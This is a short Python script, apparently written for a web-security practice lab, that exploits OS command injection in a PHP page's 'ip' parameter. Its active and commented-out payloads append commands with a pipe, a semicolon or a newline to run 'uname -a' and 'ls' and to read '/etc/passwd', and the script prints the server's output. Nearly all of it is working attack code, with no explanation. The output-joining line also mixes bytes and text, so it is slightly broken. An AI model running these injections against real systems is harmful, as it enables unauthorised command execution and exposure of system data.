import urllib.parse
import urllib.request
import lxml.etree as etree
import lxml.html

payload = {"ip": "127.0.0.1"}
payload = {"ip": "127.0.0.1|uname+-a"}

# payload = {"ip": ";ls"}
# payload = {"ip": "10.0.1.14;uname -a"}
# payload = {"ip": "127.0.0.1\ncat /etc/passwd"}

payload = urllib.parse.urlencode(payload)
# http://10.0.1.14/commandexec/example3.php?ip=127.0.0.1
url = "http://10.0.1.14/commandexec/example3.php?"+payload
print(url)

with urllib.request.urlopen(url) as reponse:
	content = reponse.read()

tree = lxml.html.fromstring(content)
node = tree.xpath("//pre")[0]

result = node.text + ''.join(etree.tostring(e) for e in node)
print(result)

